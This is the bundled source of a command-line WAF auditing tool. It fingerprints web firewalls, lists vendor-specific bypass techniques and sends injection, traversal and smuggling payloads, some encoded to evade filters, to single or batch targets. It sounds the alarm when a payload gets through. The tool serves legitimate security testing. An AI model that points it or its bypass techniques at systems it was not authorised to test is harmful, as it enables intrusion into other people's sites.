          responseBody = "[Response Too Large]";
        } else {
          responseBody = await response.text();
        }
        const detection = await this.detectFromResponse(response, responseBody, responseTime);
        return detection.detected ? detection : null;
      } catch (error) {
        console.error("Active detection probe failed:", error);
        return null;
      }
    });
    const results = (await Promise.all(probePromises)).filter((r) => r !== null);
    if (results.length > 0) {
      return results.reduce((best, current) => current.confidence > best.confidence ? current : best);
    }
    return {
      detected: false,
      wafType: "Unknown",
      confidence: 0,
      evidence: [],
      suggestedBypassTechniques: []
    };
  }
  /**
   * Get suggested bypass techniques for detected WAF
   */
  static getSuggestedBypassTechniques(wafType) {
    const techniques = {
      Cloudflare: [
        "Unicode encoding (\\u0027 instead of ')",
        "Double URL encoding (%2527 instead of %27)",
        "Mixed case keywords (uNiOn instead of UNION)",
        "Alternative space characters (\\u00A0)",
        "Comment-based obfuscation (/**/)"
      ],
      "AWS WAF": [
        "Unicode normalization bypasses",
        "Character set encoding variations",
        "Request method variations",
        "Content-Type manipulation"
      ],
      Imperva: ["Parameter pollution", "HTTP verb tampering", "Custom header injection", "Encoding combinations"],
      "F5 BIG-IP": ["Request smuggling techniques", "HTTP/1.0 downgrade", "Custom User-Agent strings"],
      ModSecurity: ["Comment-based SQL obfuscation", "Case sensitivity exploits", "Regex pattern bypasses", "Alternative operators"],
      Akamai: ["IP-based bypasses", "Origin server direct access", "Cache poisoning techniques"],
      "Azure Front Door": [
        "Case variations for SQL keywords",
        "Parameter pollution (duplicate params)",
        "Unicode encoding variations",
        "CRLF injection in headers"
      ],
      "Google Cloud Armor": [
        "Advanced request smuggling",
        "Complex encoding combinations",
        "Custom header injection (X-Forwarded-For)",
        "Path normalization bypasses"
      ],
      "Citrix NetScaler": [
        "URL encoding (double/triple)",
        "HTTP method variations (tampering)",
        "Parameter name obfuscation",
        "Cookie-based bypass techniques"
      ],
      "Palo Alto Networks": [
        "Double slash path obfuscation (//)",
        "Path normalization bypass (/./)",
        "Mixed case payload encoding",
        "Tab character (%09) as space alternative"
      ],
      "Sophos WAF": [
        "Random case variations for keywords",
        "Double URL encoding",
        "Null byte injection (%00)",
        "HTTP parameter pollution"
      ],
      "Generic WAF": [
        "Double URL encoding",
        "Unicode encoding",
        "Mixed case obfuscation",
        "Comment insertion",
        "Parameter pollution",
        "HTTP verb tampering"
      ]
    };
    return techniques[wafType] || techniques["Generic WAF"];
  }
  /**
   * Detect WAF bypass opportunities
   */
  static async detectBypassOpportunities(url, options) {
    const fetchFn = options?.fetch || globalThis.fetch;
    const opportunities = {
      httpMethodsBypass: false,
      headerBypass: false,
      encodingBypass: false,
      parameterPollution: false
    };
    try {
      const separator = url.includes("?") ? "&" : "?";
      const encodedPayload = "%2527%2520OR%25201%253D1";
      const [methodResponse, headerResponse, encodingResponse, pollutionResponse] = await Promise.all([
        // Test HTTP method bypass
        fetchFn(url, { method: "TRACE", redirect: "manual" }),
        // Test header bypass with X-Original-URL
        fetchFn(url, {
          method: "GET",
          headers: { "X-Original-URL": "/admin" },
          redirect: "manual"
        }),
        // Test encoding bypass
        fetchFn(`${url}${separator}test=${encodedPayload}`, {
          method: "GET",
          redirect: "manual"
        }),
        // Test parameter pollution
        fetchFn(`${url}${separator}test=safe&test=malicious`, {
          method: "GET",
          redirect: "manual"
        })
      ]);
      if (methodResponse.status !== 405) {
        opportunities.httpMethodsBypass = true;
      }
      if (headerResponse.status === 200) {
        opportunities.headerBypass = true;
      }
      if (encodingResponse.status === 200) {
        opportunities.encodingBypass = true;
      }
      if (pollutionResponse.status === 200) {
        opportunities.parameterPollution = true;
      }
    } catch (error) {
      console.error("Bypass opportunity detection failed:", error);
    }
    return opportunities;
  }
};

// ../core/dist/check.js
async function sendRequest(url, method, payload, headersObj, payloadTemplate, followRedirect = false, useEnhancedPayloads = false, detectedWAF, httpManipulation, options) {
  const fetchFn = options?.fetch || globalThis.fetch;
  try {
    let resp;
    const headers = headersObj ? new Headers(headersObj) : void 0;
    const startTime = Date.now();
    let finalPayload = payload;
    if (detectedWAF && payload) {
      const wafSpecificPayloads = generateWAFSpecificPayloads(detectedWAF, payload);
      if (wafSpecificPayloads.length > 1) {
        finalPayload = wafSpecificPayloads[1];
      }
    }
    let finalUrl = url;
    if (finalPayload !== void 0) {
      if (url.includes("{PAYLOAD}")) {
        finalUrl = url.replace(/\{PAYLOAD\}/g, encodeURIComponent(finalPayload));
      } else if (method === "GET" || method === "DELETE") {
        const separator = url.includes("?") ? "&" : "?";
        finalUrl = url + `${separator}test=${encodeURIComponent(finalPayload)}`;
      }
    }
    if (!isValidTargetUrl(finalUrl)) {
      console.error(`Blocked SSRF attempt to: ${redactUrl(finalUrl)}`);
      return { status: "BLOCKED", is_redirect: false, responseTime: 0 };
    }
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 1e4);
    try {
      let currentUrl = finalUrl;
      let currentMethod = method;
      let currentHeaders = headers;
      let currentBody = void 0;
      if (method === "POST" || method === "PUT") {
        if (payloadTemplate) {
          let jsonObj;
          try {
            jsonObj = JSON.parse(payloadTemplate);
            jsonObj = substitutePayload(jsonObj, finalPayload ?? "");
          } catch {
            jsonObj = { test: finalPayload ?? "" };
          }
          currentBody = JSON.stringify(jsonObj);
          const newHeaders = new Headers(currentHeaders || {});
          newHeaders.set("Content-Type", "application/json");
          currentHeaders = newHeaders;
        } else {
          currentBody = new URLSearchParams({ test: finalPayload ?? "" });
        }
      }
      let redirectCount = 0;
      const maxRedirects = 5;
      while (true) {
        const fetchOptions = {
          method: currentMethod,
          redirect: "manual",
          headers: currentHeaders,
          body: currentBody,
          signal: controller.signal
        };
        resp = await fetchFn(currentUrl, fetchOptions);
        if (followRedirect && resp.status >= 300 && resp.status < 400 && redirectCount < maxRedirects) {
          const location = resp.headers.get("Location");
          if (!location)
            break;
          const nextUrl = new URL(location, currentUrl).toString();
          if (!isValidTargetUrl(nextUrl)) {
            console.error(`Blocked SSRF redirect attempt to: ${redactUrl(nextUrl)}`);
            return { status: "BLOCKED", is_redirect: true, responseTime: Date.now() - startTime };
          }
          const status = resp.status;
          if (status === 301 || status === 302 || status === 303) {
            currentMethod = "GET";
            currentBody = void 0;
            if (currentHeaders) {
              const newHeaders = new Headers(currentHeaders);
              newHeaders.delete("Content-Type");
              newHeaders.delete("Content-Length");
              currentHeaders = newHeaders;
            }
          }
          currentUrl = nextUrl;
          redirectCount++;
          continue;
        }
        break;
      }
    } finally {
      clearTimeout(timeoutId);
    }
    const responseTime = Date.now() - startTime;
    let logMsg;
    if (options?.color) {
      const whitePart = `\x1B[97mRequest to ${redactUrl(url)}\x1B[0m`;
      const methodPart = `\x1B[33m${method}\x1B[0m`;
      const payloadPart = `\x1B[36m${payload ?? "(none)"}\x1B[0m`;
      const headersPart = `\x1B[90m${JSON.stringify(redactHeaders(headersObj))}\x1B[0m`;
      let statusPart = String(resp.status);
      if (resp.status === 403) {
        statusPart = `\x1B[32m403\x1B[0m`;
      } else if (resp.status >= 200 && resp.status < 300) {
        statusPart = `\x1B[31m${resp.status}\x1B[0m`;
      } else if (resp.status >= 300 && resp.status < 400) {
        statusPart = `\x1B[33m${resp.status}\x1B[0m`;
      } else {
        statusPart = `\x1B[31m${resp.status}\x1B[0m`;
      }
      logMsg = `${whitePart} with method ${methodPart} and payload ${payloadPart} and headers ${headersPart} returned status ${statusPart} in ${responseTime}ms`;
    } else {
      logMsg = `Request to ${redactUrl(url)} with method ${method} and payload ${payload ?? "(none)"} and headers ${JSON.stringify(redactHeaders(headersObj))} returned status ${resp.status} in ${responseTime}ms`;
    }
    console.log(logMsg);
    return {
      status: resp.status,
      is_redirect: resp.status >= 300 && resp.status < 400,
      responseTime,
      response: resp
    };
  } catch (e) {
    console.error(`Request error for ${redactUrl(url)}:`, e);
    return { status: "ERR", is_redirect: false, responseTime: 0 };
  }
}
async function handleApiCheckFiltered(url, page, methods, categories, payloadTemplate, followRedirect = false, customHeaders, falsePositiveTest = false, caseSensitiveTest = false, useEnhancedPayloads = false, useAdvancedPayloads = false, autoDetectWAF = false, useEncodingVariations = false, detectedWAF, httpManipulation, options) {
  const METHODS = methods && methods.length ? methods : ["GET"];
  const results = [];
  let baseUrl;
  const limit = 50;
  const start = page * limit;
  const end = start + limit;
  let offset = 0;
  try {
    const u = new URL(url);
    baseUrl = `${u.protocol}//${u.host}`;
  } catch {
    baseUrl = url;
  }
  if (caseSensitiveTest) {
    try {
      const u = new URL(url);
      const originalHostname = u.hostname;
      const modifiedHostname = randomUppercase(originalHostname);
      const protocolAndSlashes = u.protocol + "//";
      const hostPortion = url.slice(protocolAndSlashes.length);
      const hostEnd = hostPortion.indexOf("/") === -1 ? hostPortion.length : hostPortion.indexOf("/");
      const hostPart = hostPortion.slice(0, hostEnd);
      const rest = hostPortion.slice(hostEnd);
      const newHostPart = hostPart.replace(originalHostname, modifiedHostname);
      url = protocolAndSlashes + newHostPart + rest;
      baseUrl = `${u.protocol}//${newHostPart}`;
    } catch (e) {
      url = randomUppercase(url);
      baseUrl = randomUppercase(baseUrl);
    }
  }
  let wafDetectionResult;
  if (autoDetectWAF) {
    try {
      wafDetectionResult = await WAFDetector.activeDetection(url.replace(/\{PAYLOAD\}/g, ""), options);
      console.log(`WAF Detection Result: ${JSON.stringify(wafDetectionResult)}`);
    } catch (e) {
      console.error("WAF detection failed:", e);
    }
  }
  let payloadSource = useEnhancedPayloads ? ENHANCED_PAYLOADS : PAYLOADS;
  if (useAdvancedPayloads) {
    payloadSource = { ...payloadSource, ...ADVANCED_PAYLOADS };
  }
  if (useEncodingVariations) {
    const encodedPayloads = generateEncodedPayloads(payloadSource);
    payloadSource = { ...payloadSource, ...encodedPayloads };
  }
  const payloadEntries = categories && categories.length ? Object.entries(payloadSource).filter(([cat]) => categories.includes(cat)) : Object.entries(payloadSource);
  for (const [category, info] of payloadEntries) {
    const checkType = info.type || "ParamCheck";
    const payloads = falsePositiveTest ? info.falsePayloads || [] : info.payloads || [];
    if (checkType === "ParamCheck") {
      for (let payload of payloads) {
        if (caseSensitiveTest) {
          payload = randomUppercase(payload);
        }
        let payloadVariations = [payload];
        const wafType = detectedWAF || (wafDetectionResult?.detected ? wafDetectionResult.wafType : void 0);
        if (wafType) {
          const wafSpecificPayloads = generateWAFSpecificPayloads(wafType, payload);
          if (wafSpecificPayloads.length > 1) {
            payloadVariations.push(...wafSpecificPayloads);
          }
        }
        if (useEncodingVariations) {
          const encodedVariations = PayloadEncoder.generateBypassVariations(payload, category);
          payloadVariations.push(...encodedVariations);
        }
        payloadVariations = [...new Set(payloadVariations)];
        for (const currentPayload of payloadVariations) {
          for (const method of METHODS) {
            if (offset >= end)
              return results;
            if (offset >= start) {
              let headersObj = customHeaders ? processCustomHeaders(customHeaders, currentPayload) : void 0;
              let finalPayload = currentPayload;
              let finalMethod = method;
              if (httpManipulation?.enableParameterPollution) {
                const pollutedPayloads = generateHTTPManipulationPayloads(currentPayload, "pollution");
                if (pollutedPayloads.length > 1) {
                  finalPayload = pollutedPayloads[1];
                }
              }
              const detectedWAFType = detectedWAF || (wafDetectionResult?.detected ? wafDetectionResult.wafType : void 0);
              const res = await sendRequest(url, finalMethod, finalPayload, headersObj, payloadTemplate, followRedirect, useEnhancedPayloads, detectedWAFType, void 0, options);
              results.push({
                category,
                payload: currentPayload,
                originalPayload: payload,
                // Keep track of original
                method,
                status: res ? res.status : "ERR",
                is_redirect: res ? res.is_redirect : false,
                responseTime: res ? res.responseTime : 0,
                wafDetected: wafDetectionResult?.detected || false,
                wafType: detectedWAFType || "Unknown",
                bypassTechnique: currentPayload !== payload ? "Advanced" : "Standard"
              });
            }
            offset++;
          }
        }
      }
    } else if (checkType === "FileCheck") {
      for (let payload of payloads) {
        if (caseSensitiveTest) {
          payload = randomUppercase(payload);
        }
        if (offset >= end)
          return results;
        if (offset >= start) {
          const fileUrl = baseUrl.replace(/\/$/, "") + "/" + payload.replace(/^\//, "");
          const headersObj = customHeaders ? processCustomHeaders(customHeaders, payload) : void 0;
          const res = await sendRequest(fileUrl, "GET", void 0, headersObj, void 0, followRedirect, useEnhancedPayloads, detectedWAF || (wafDetectionResult?.detected ? wafDetectionResult.wafType : void 0), void 0, options);
          results.push({
            category,
            payload,
            method: "GET",
            status: res ? res.status : "ERR",
            is_redirect: res ? res.is_redirect : false,
            responseTime: res ? res.responseTime : 0,
            wafDetected: wafDetectionResult?.detected || false,
            wafType: detectedWAF || (wafDetectionResult?.detected ? wafDetectionResult.wafType : "Unknown")
          });
        }
        offset++;
      }
    } else if (checkType === "Header") {
      for (let payload of payloads) {
        if (caseSensitiveTest) {
          payload = randomUppercase(payload);
        }
        const headersObj = {};
        for (const line of payload.split(/\r?\n/)) {
          const idx = line.indexOf(":");
          if (idx > 0) {
            const name = line.slice(0, idx).trim();
            const value = line.slice(idx + 1).trim();
            headersObj[name] = value;
          }
        }
        if (customHeaders) {
          const customHeadersObj = processCustomHeaders(customHeaders, payload);
          Object.assign(headersObj, customHeadersObj);
        }
        for (const method of METHODS) {
          if (offset >= end)
            return results;
          if (offset >= start) {
            const res = await sendRequest(url, method, void 0, headersObj, payloadTemplate, followRedirect, useEnhancedPayloads, detectedWAF || (wafDetectionResult?.detected ? wafDetectionResult.wafType : void 0), void 0, options);
            results.push({
              category,
              payload,
              method,
              status: res ? res.status : "ERR",
              is_redirect: res ? res.is_redirect : false,
              responseTime: res ? res.responseTime : 0,
              wafDetected: wafDetectionResult?.detected || false,
              wafType: detectedWAF || (wafDetectionResult?.detected ? wafDetectionResult.wafType : "Unknown")
            });
          }
          offset++;
        }
      }
    }
  }
  return results;
}

// src/index.ts
var useColor = true;
var colors = {
  green: (text) => useColor ? `\x1B[32m${text}\x1B[0m` : text,
  red: (text) => useColor ? `\x1B[31m${text}\x1B[0m` : text,
  yellow: (text) => useColor ? `\x1B[33m${text}\x1B[0m` : text,
  cyan: (text) => useColor ? `\x1B[36m${text}\x1B[0m` : text,
  bold: (text) => useColor ? `\x1B[1m${text}\x1B[0m` : text,
  dim: (text) => useColor ? `\x1B[2m${text}\x1B[0m` : text
};
var supportedMethods = [
  "GET",
  "POST",
  "PUT",
  "DELETE",
  "PATCH",
  "TRACE",
  "OPTIONS",
  "HEAD",
  "PROPFIND",
  "REPORT",
  "LOCK",
  "UNLOCK",
  "COPY",
  "MOVE"
];
var supportedCategories = Object.keys(PAYLOADS);
var supportedWafs = WAFDetector.getSupportedWafs();
var detailedHelp = `
Supported HTTP Methods (-m, --methods):
${supportedMethods.map((m) => `  - ${m}`).join("\n")}

Supported Payload Categories (-c, --categories):
${supportedCategories.map((c) => `  - ${c}`).join("\n")}

Supported WAF Vendors (--detected-waf):
${supportedWafs.map((w) => `  - ${w}`).join("\n")}
`;
var program = new Command();
program.name("waf-checker").description("WAF Security Testing Tool (CLI version)").version("1.0.0").showHelpAfterError().option("--no-color", "Disable colored output").addHelpText("after", detailedHelp);
program.hook("preAction", () => {
  const opts = program.opts();
  if (opts.color === false || process.env.NO_COLOR || !process.stdout.isTTY) {
    useColor = false;
  }
});
function getFetch(proxyUrl) {
  if (proxyUrl) {
    const agent = new ProxyAgent(proxyUrl);
    return ((url, init) => undiciFetch(url, { ...init, dispatcher: agent }));
  }
  return globalThis.fetch;
}
function parseCustomHeaders(headersOpt) {
  if (!headersOpt) return void 0;
  try {
    if (fs.existsSync(headersOpt)) {
      return fs.readFileSync(headersOpt, "utf8");
    }
  } catch {
  }
  return headersOpt;
}
function parseCommaList(val) {
  if (!val) return void 0;
  return val.split(",").map((x) => x.trim()).filter(Boolean);
}
function formatTime(ms) {
  return `${ms}ms`;
}
program.command("detect <url>").description("Detect WAF vendor and status of a target URL").option("-p, --proxy <url>", "Proxy URL (HTTP/HTTPS)").option("--json", "Output results in JSON format").action(async (url, options) => {
  try {
    if (!isValidTargetUrl(url)) {
      console.error(`Error: Invalid target URL "${url}" or restricted IP.`);
      process.exit(1);
    }
    const customFetch = getFetch(options.proxy);
    const detection = await WAFDetector.activeDetection(url, { fetch: customFetch });
    if (options.json) {
      console.log(JSON.stringify(detection, null, 2));
      return;
    }
    console.log(`
=== WAF Detection Results for ${colors.cyan(url)} ===`);
    console.log(`Status:      ${detection.detected ? colors.green("\u{1F6E1}\uFE0F WAF DETECTED") : colors.yellow("\u274C WAF NOT DETECTED")}`);
    console.log(`WAF Type:    ${colors.bold(detection.wafType)}`);
    let confidenceColor = colors.yellow;
    if (detection.confidence > 70) confidenceColor = colors.green;
    else if (detection.confidence < 40) confidenceColor = colors.red;
    console.log(`Confidence:  ${confidenceColor(`${detection.confidence}%`)}`);
    if (detection.evidence.length > 0) {
      console.log("\nEvidence:");
      detection.evidence.forEach((ev) => console.log(`  - ${colors.dim(ev)}`));
    }
    if (detection.suggestedBypassTechniques.length > 0) {
      console.log("\nSuggested Bypass Techniques:");
      detection.suggestedBypassTechniques.forEach((tech) => console.log(`  - ${colors.cyan(tech)}`));
    }
    console.log();
  } catch (err) {
    console.error(`Error: WAF detection failed: ${err.message}`);
    process.exit(1);
  }
});
var checkCmd = program.command("check <url>");
checkCmd.description("Run vulnerability payload audit against a target URL").option("-p, --proxy <url>", "Proxy URL (e.g., http://127.0.0.1:8080)").option("-m, --methods <methods>", "HTTP methods (comma-separated). Supported: GET, POST, PUT, DELETE, PATCH, TRACE, OPTIONS, HEAD, PROPFIND, REPORT, LOCK, UNLOCK, COPY, MOVE", "GET").option("-c, --categories <categories>", "Payload categories (comma-separated). Supported: SQL Injection, XSS, Path Traversal, Command Injection, SSRF, NoSQL Injection, Local File Inclusion, LDAP Injection, HTTP Request Smuggling, Open Redirect, Sensitive Files, CRLF Injection, UTF8/Unicode Bypass, XXE, SSTI, HTTP Parameter Pollution, Web Cache Poisoning, IP Bypass, User-Agent").option("--detected-waf <vendor>", "Force WAF signature and use WAF-specific bypasses. Supported: Cloudflare, AWS WAF, Imperva, F5 BIG-IP, ModSecurity, Akamai, Barracuda, Sucuri, Fastly, KeyCDN, StackPath, DenyAll, FortiWeb, Wallarm, Radware, Azure Front Door, Google Cloud Armor, Citrix NetScaler, Varnish, Palo Alto Networks, Sophos WAF").option("--payload-template <template>", `JSON or text template (e.g., '{"input": "{PAYLOAD}"}')`).option("--follow-redirects", "Follow HTTP redirects", false).option("--custom-headers <headers>", "Raw headers string (e.g., 'X-Custom: value\\nCookie: name=val') or file path").option("--false-positives", "Run false positive test payloads", false).option("--case-sensitive", "Run case-sensitive variations", false).option("--enhanced", "Use enhanced payload set", false).option("--advanced", "Use advanced bypass payloads", false).option("--auto-detect-waf", "Detect WAF first and try WAF-specific bypasses", false).option("--encoding-variations", "Use encoding and obfuscation variations", false).option("--http-manipulation", "Run HTTP manipulation tests (Verb Tampering, Parameter Pollution, etc.)", false).option("--json", "Output results in JSON format").addHelpText("after", detailedHelp).action(async (url, options) => {
  try {
    const testUrl = url.replace(/\{PAYLOAD\}/g, "test-payload");
    if (!isValidTargetUrl(testUrl)) {
      console.error(`Error: Invalid target URL "${url}" or restricted IP.`);
      process.exit(1);
    }
    const customFetch = getFetch(options.proxy);
    const methods = parseCommaList(options.methods) || ["GET"];
    const categories = parseCommaList(options.categories);
    const headers = parseCustomHeaders(options.customHeaders);
    const results = await handleApiCheckFiltered(
      url,
      0,
      // Start with page 0 (all payloads by default for CLI)
      methods,
      categories,
      options.payloadTemplate,
      options.followRedirects,
      headers,
      options.falsePositives,
      options.caseSensitive,
      options.enhanced,
      options.advanced,
      options.autoDetectWaf,
      options.encodingVariations,
      options.detectedWaf,
      options.httpManipulation ? {
        enableParameterPollution: true,
        enableVerbTampering: true,
        enableContentTypeConfusion: true
      } : void 0,
      { fetch: customFetch, color: useColor }
    );
    if (options.json) {
      console.log(JSON.stringify(results, null, 2));
      return;
    }
    console.log(`
=== WAF Audit Results for ${colors.cyan(url)} ===`);
    console.log(`Total tests executed: ${results.length}`);
    const blocked = results.filter((r) => r.status === 403 || r.status === "BLOCKED");
    const bypassed = results.filter((r) => r.status === 200 || r.status === "200");
    const redirect = results.filter((r) => r.is_redirect);
    const errors = results.filter((r) => r.status === "ERR");
    console.log(`  \u{1F6E1}\uFE0F Blocked:   ${colors.green(`${blocked.length} (${results.length ? Math.round(blocked.length / results.length * 100) : 0}%)`)}`);
    console.log(`  \u{1F513} Bypassed:  ${bypassed.length > 0 ? colors.red(`${bypassed.length} (${results.length ? Math.round(bypassed.length / results.length * 100) : 0}%)`) : colors.green("0 (0%)")}`);
    if (redirect.length > 0) console.log(`  \u{1F504} Redirects: ${colors.yellow(String(redirect.length))}`);
    if (errors.length > 0) console.log(`  \u26A0\uFE0F Errors:    ${colors.red(String(errors.length))}`);
    if (bypassed.length > 0) {
      console.log(`
${colors.red("\u26A0\uFE0F SUCCESSFUL BYPASSES DETECTED:")}`);
      console.log("--------------------------------------------------------------------------------");
      console.log(`| ${"Category".padEnd(18)} | ${"Method".padEnd(6)} | ${"Status".padEnd(6)} | ${"Time".padEnd(6)} | ${"Payload".padEnd(40)} |`);
      console.log("--------------------------------------------------------------------------------");
      bypassed.slice(0, 50).forEach((r) => {
        const cat = colors.cyan(r.category.substring(0, 18).padEnd(18));
        const meth = r.method.padEnd(6);
        const stat = colors.red(String(r.status).padEnd(6));
        const time = formatTime(r.responseTime).padEnd(6);
        const pay = colors.bold(r.payload.substring(0, 40).padEnd(40));
        console.log(`| ${cat} | ${meth} | ${stat} | ${time} | ${pay} |`);
      });
      if (bypassed.length > 50) {
        console.log(`... and ${colors.yellow(String(bypassed.length - 50))} more bypasses.`);
      }
      console.log("--------------------------------------------------------------------------------");
    } else {
      console.log(`
${colors.green("\u{1F6E1}\uFE0F Perfect Score: All attack vectors were successfully blocked.")}`);
    }
    console.log();
  } catch (err) {
    console.error(`Error: Audit failed: ${err.message}`);
    process.exit(1);
  }
});
var batchCmd = program.command("batch <file>");
batchCmd.description("Run batch audits for a list of URLs defined in a file").option("-p, --proxy <url>", "Proxy URL (e.g., http://127.0.0.1:8080)").option("-m, --methods <methods>", "HTTP methods (comma-separated). Supported: GET, POST, PUT, DELETE, PATCH, TRACE, OPTIONS, HEAD, PROPFIND, REPORT, LOCK, UNLOCK, COPY, MOVE", "GET").option("-c, --categories <categories>", "Payload categories (comma-separated). Supported: SQL Injection, XSS, Path Traversal, Command Injection, SSRF, NoSQL Injection, Local File Inclusion, LDAP Injection, HTTP Request Smuggling, Open Redirect, Sensitive Files, CRLF Injection, UTF8/Unicode Bypass, XXE, SSTI, HTTP Parameter Pollution, Web Cache Poisoning, IP Bypass, User-Agent", "SQL Injection,XSS").option("--detected-waf <vendor>", "Force WAF signature and use WAF-specific bypasses. Supported: Cloudflare, AWS WAF, Imperva, F5 BIG-IP, ModSecurity, Akamai, Barracuda, Sucuri, Fastly, KeyCDN, StackPath, DenyAll, FortiWeb, Wallarm, Radware, Azure Front Door, Google Cloud Armor, Citrix NetScaler, Varnish, Palo Alto Networks, Sophos WAF").option("--payload-template <template>", `JSON or text template (e.g., '{"input": "{PAYLOAD}"}')`).option("--follow-redirects", "Follow HTTP redirects", false).option("--custom-headers <headers>", "Raw headers string (e.g., 'X-Custom: value\\nCookie: name=val') or file path").option("--false-positives", "Run false positive test payloads", false).option("--case-sensitive", "Run case-sensitive variations", false).option("--enhanced", "Use enhanced payload set", false).option("--advanced", "Use advanced bypass payloads", false).option("--auto-detect-waf", "Detect WAF first and try WAF-specific bypasses", false).option("--encoding-variations", "Use encoding and obfuscation variations", false).option("--http-manipulation", "Run HTTP manipulation tests", false).option("--concurrency <number>", "Number of concurrent URLs to test", "3").option("--json", "Output results in JSON format").addHelpText("after", detailedHelp).action(async (file, options) => {
  try {
    if (!fs.existsSync(file)) {
      console.error(`Error: File "${file}" does not exist.`);
      process.exit(1);
    }
    const content = fs.readFileSync(file, "utf8");
    const urls = content.split(/\r?\n/).map((u) => u.trim()).filter((u) => u && !u.startsWith("#"));
    const validUrls = [];
    for (const url of urls) {
      const testUrl = url.replace(/\{PAYLOAD\}/g, "test-payload");
      if (isValidTargetUrl(testUrl)) {
        validUrls.push(url);
      } else {
        console.warn(`Warning: Skipping invalid or restricted target URL "${url}"`);
      }
    }
    if (validUrls.length === 0) {
      console.error("Error: No valid URLs found in file.");
      process.exit(1);
    }
    const customFetch = getFetch(options.proxy);
    const concurrency = parseInt(options.concurrency, 10) || 3;
    const methods = parseCommaList(options.methods) || ["GET"];
    const categories = parseCommaList(options.categories);
    const headers = parseCustomHeaders(options.customHeaders);
    console.log(`
Starting batch audit for ${validUrls.length} targets (concurrency = ${concurrency})...
`);
    const batchResults = [];
    let completed = 0;
    const pool = async () => {
      while (validUrls.length > 0) {
        const url = validUrls.shift();
        if (!url) break;
        try {
          if (!options.json) {
            console.log(`[${++completed}/${urls.length}] Scanning ${redactUrl(url)}...`);
          }
          const res = await handleApiCheckFiltered(
            url,
            0,
            methods,
            categories,
            options.payloadTemplate,
            options.followRedirects,
            headers,
            options.falsePositives,
            options.caseSensitive,
            options.enhanced,
            options.advanced,
            options.autoDetectWaf,
            options.encodingVariations,
            options.detectedWaf,
            options.httpManipulation ? {
              enableParameterPollution: true,
              enableVerbTampering: true,
              enableContentTypeConfusion: true
            } : void 0,
            { fetch: customFetch, color: useColor }
          );
          const blocked = res.filter((r) => r.status === 403 || r.status === "BLOCKED");
          const bypassed = res.filter((r) => r.status === 200 || r.status === "200");
          batchResults.push({
            url,
            success: true,
            total: res.length,
            blocked: blocked.length,
            bypassed: bypassed.length,
            bypassRate: res.length ? Math.round(bypassed.length / res.length * 100) : 0
          });
        } catch (err) {
          if (!options.json) {
            console.error(`Error scanning ${redactUrl(url)}: ${err.message}`);
          }
          batchResults.push({
            url,
            success: false,
            error: err.message
          });
        }
      }
    };
    const workers = Array(concurrency).fill(null).map(() => pool());
    await Promise.all(workers);
    if (options.json) {
      console.log(JSON.stringify(batchResults, null, 2));
      return;
    }
    console.log(`
=== ${colors.bold("Batch Audit Summary")} ===`);
    console.log("--------------------------------------------------------------------------------");
    console.log(`| ${"Target URL".padEnd(35)} | ${"Success".padEnd(8)} | ${"Total".padEnd(6)} | ${"Blocked".padEnd(8)} | ${"Bypassed".padEnd(8)} |`);
    console.log("--------------------------------------------------------------------------------");
    batchResults.forEach((r) => {
      const urlStr = colors.cyan(redactUrl(r.url).substring(0, 35).padEnd(35));
      const succ = r.success ? colors.green("YES".padEnd(8)) : colors.red("NO".padEnd(8));
      const tot = String(r.total || 0).padEnd(6);
      const blk = colors.green(String(r.blocked || 0).padEnd(8));
      const byp = (r.bypassed > 0 ? colors.red : colors.green)(String(r.bypassed || 0).padEnd(8));
      console.log(`| ${urlStr} | ${succ} | ${tot} | ${blk} | ${byp} |`);
    });
    console.log("--------------------------------------------------------------------------------\n");
  } catch (err) {
    console.error(`Error: Batch audit failed: ${err.message}`);
    process.exit(1);
  }
});
if (typeof process !== "undefined" && process.env.NODE_ENV !== "test" && !process.env.VITEST) {
  if (process.argv.length <= 2) {
    program.outputHelp();
    process.exit(0);
  }
  program.parse(process.argv);
}
export {
  program
};
